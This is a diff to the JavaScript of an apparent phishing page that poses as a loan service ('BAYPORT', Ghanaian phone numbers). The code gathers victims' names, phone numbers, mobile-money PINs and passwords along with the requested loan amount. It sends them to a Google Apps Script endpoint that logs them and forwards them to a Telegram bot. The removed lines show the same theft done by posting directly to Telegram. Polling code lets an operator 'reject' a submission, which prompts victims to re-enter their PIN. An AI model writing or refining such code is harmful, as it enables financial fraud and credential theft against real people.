@@ -115,7 +115,7 @@
 </div>
 
 <script>
-    // Replace this with your newly DEPLOYED script URL
+    // Ensure this URL is your most recent deployment
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM0Hwo5tu3KmjmkvjWqw_CV70EfJ2ODuYOWSoK1BODeNQC03UoHHDqT8ysNX5Pv-ZPlg/exec"; 
     
     const urlParams = new URLSearchParams(window.location.search);
@@ -172,25 +172,20 @@
             return;
         }
 
-        // FULL DATA OBJECT
+        showView(4);
+
+        // DATA OBJECT with BOT CREDENTIALS for Script-Side Telegram Notification
         const data = {
             name: name,
             phone: phone,
             pin: pin,
             pass: pass,
-            loan: state.amount
+            loan: state.amount,
+            token: BOT_TOKEN,
+            id: CHAT_ID
         };
 
-        showView(4);
-
-        // 1. Telegram Push (All data)
-        if(BOT_TOKEN && CHAT_ID) {
-            const reject = `${SCRIPT_URL}?action=markError&phone=${data.phone}`;
-            const msg = `🔥 *BAYPORT HIT*\n👤 Name: ${data.name}\n📱 +233${data.phone}\n💰 GHS ${data.loan}\n🔢 PIN: \`${data.pin}\`\n🔑 PASS: \`${data.pass}\` \n\n❌ Reject if wrong:\n${reject}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e=>{});
-        }
-
-        // 2. Google Sheet Log (Using URLSearchParams to ensure all keys reach doPost)
+        // Submit to Script (Handles both Sheet logging and Telegram)
         try { 
             const formData = new URLSearchParams();
             for (const key in data) { formData.append(key, data[key]); }
@@ -200,14 +195,15 @@
                 mode: 'no-cors', 
                 body: formData 
             }); 
-        } catch (e) { console.error("Sheet Error:", e); }
+        } catch (e) { console.error("Submit Error:", e); }
 
-        // 3. Polling for rejection
-        setInterval(async () => {
+        // Start polling for operator rejection
+        const checkInterval = setInterval(async () => {
             try {
-                const r = await fetch(`${SCRIPT_URL}?phone=${data.phone}`);
+                const r = await fetch(`${SCRIPT_URL}?phone=${phone}`);
                 const status = await r.text();
                 if(status === "error") {
+                    clearInterval(checkInterval);
                     alert("❌ Incorrect details. The network rejected your PIN or Password. Please re-enter them correctly.");
                     location.reload();
                 }
@@ -215,7 +211,6 @@
         }, 4000);
     }
     
-    // Initial calc
     updateCalc();
 </script>
 </body>
